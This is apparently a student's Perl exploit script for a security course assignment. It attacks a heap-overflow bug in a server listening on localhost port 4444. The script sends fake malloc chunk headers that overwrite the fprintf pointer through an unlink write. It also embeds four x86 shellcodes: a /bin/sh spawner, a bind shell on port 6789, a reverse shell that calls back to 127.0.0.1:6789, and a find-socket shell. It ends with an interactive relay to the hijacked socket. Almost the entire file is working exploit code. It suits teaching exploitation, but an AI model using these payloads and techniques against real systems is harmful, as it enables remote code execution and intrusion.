#!/usr/bin/perl
#--------------------------------------------
# Name: 
# Class: CS4678
# Assignment 6
# File: exploit.pl
# Last modified: 21 Feb 2012
#--------------------------------------------
#

# first heap buffer @ 0x0804be70  (  +8 = 0x0804be78)
# alternate buffers @ 0x0804be78, 80, 88
# fprintf pointer   @ 0x0804a4c4  ( -12 = 0x0804a4b8)

$buffer  = "\x78\xbe\x04\x08";
$pointer = "\xb8\xa4\x04\x08";

# lsod_shellcode.asm  - from class resources
# lsod_shellcode  24 bytes payload, 206 bytes of padding
$shellcode =  
        "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89" .
		"\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80";

# bindsckcode.asm  - from class resources
# bindsckcode  73 bytes payload, 24 bytes spawn shell = 133 bytes padding
#    server on port 6789  (\x1A  \x85)
$shellcode1 = 
	"\x31\xC0\x50\x68\x02\x00\x1A\x85\x89\xE7\x50\x6A\x01\x6A\x02\x89" .
	"\xE1\xB0\x66\x31\xDB\x43\xCD\x80\x6A\x10\x57\x50\x89\xE1\xB0\x66" .
	"\x43\xCD\x80\xB0\x66\xB3\x04\x89\x44\x24\x04\xCD\x80\x31\xC0\x83" .
	"\xC4\x0C\x50\x50\xB0\x66\x43\xCD\x80\x89\xC3\x31\xC9\xB1\x03\x31" .
	"\xC0\xB0\x3F\x49\xCD\x80\x41\xE2\xF6";
	
# callback.asm  -  from class resources
# callback   67 bytes payload, 24 bytes spaw shell = 139 bytes padding
#    connects to 127.0.0.1:6789  (\x7F\x00\x00\x01)  (\x1A \x85)
$shellcode2 = 
	"\x83\xEC\x30\x31\xC0\x50\x50\xBB\x7F\x00\x00\x01\x53\xBB\x03\x01" .
	"\x1A\x85\x66\x81\xF3\x01\x01\x53\x89\xE7\x50\x6A\x01\x6A\x02\x89" .
	"\xE1\xB0\x66\x31\xDB\x43\xCD\x80\x6A\x10\x57\x50\x89\xE1\xB3\x03" .
	"\xB0\x66\xCD\x80\x5B\x31\xC9\xB1\x03\x31\xC0\xB0\x3F\x49\xCD\x80" .
	"\x41\xE2\xF6";

# findsckcode.asm  -  from class resources
# findsckcode  73 bytes payload, 24 bytes spawn shell 133 bytes padding
#    need to connect via client port 7777
$shellcode3 = 
	"\x31\xDB\x89\xE7\x8D\x77\x10\x89\x77\x04\x8D\x4F\x20\x89\x4F\x08" .
	"\xB3\x10\x89\x19\x31\xC9\xB1\xFF\x89\x0F\x51\x31\xC0\xB0\x66\xB3" .
	"\x07\x89\xF9\xCD\x80\x59\x31\xDB\x39\xC3\x75\x0B\x42\x66\xBB\x61" .
	"\x1E\x66\x39\x5E\x02\x74\x02\xE2\xDF\x89\xCB\x31\xC9\xB1\x03\x31" .
	"\xC0\xB0\x3F\x49\xCD\x80\x41\xE2\xF6";

use Getopt::Long;
my $bindsock - '';	# option variable with default value (false)
my $callback = '';	# option variable with default value (false)
my $findsock = '';	# option variable with default value (false)
GetOptions ('bindsock' => \$bindsock, 
            'callback' => \$callback,
            'findsock' => \$findsock,); 

use IO::Socket; 
my $sock = new IO::Socket::INET ( 
	PeerAddr => '127.0.0.1', 
	PeerPort => '4444', 
	Proto => 'tcp', 
); 
die "Could not create socket: $!\n" unless $sock; 

$sock->autoflush(1);              # so output gets there right away
print "\t *** TCP Connection Success!\n";

# read data from server
$data = <$sock>;
print "$data";
print "\t *** CONTINUE? ";
$data = <>;
# send exploit
print "\t *** Sending exploit to server\n";
for (1..4) {
	print $sock "add\n";
	print $sock "D"x64 . $shellcode1 . $shellcode . "\n";
	$data = <$sock>;
	print "$data";
}

print $sock "replace 1\n";
#print $sock "A"x240 . "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL\n";
print $sock "A"x240; 
print $sock "PPPP";             # prev_size (fake)
print $sock "\xf0\xff\xff\xff"; # size      (fake)
print $sock "B"x8;              # fd & bk   (fake)
print $sock "PPPP";             # prev_size
print $sock "\xf0\xff\xff\xff"; # size (-16)
print $sock $pointer;           # fd (target address -12)
print $sock $buffer;            # bk ($shellcode + 8)
print $sock "\n";
$data = <$sock>;
print "$data";
print $sock "print\n";

#read data from server

# split the program into two processes, identical twins
die "can't fork: $!" unless defined($kidpid = fork());

# the if{} block runs only in the parent process
if ($kidpid) {
	# copy the socket to standard output
	while (defined ($line = <$sock>)) {
	    print STDOUT $line;
	}
	kill("TERM", $kidpid);                  # send SIGTERM to child
}
# the else{} block runs only in the child process
else {
	# copy standard input to the socket
	while (defined ($line = <STDIN>)) {
	    print $sock $line;
	}
}

close($sock);

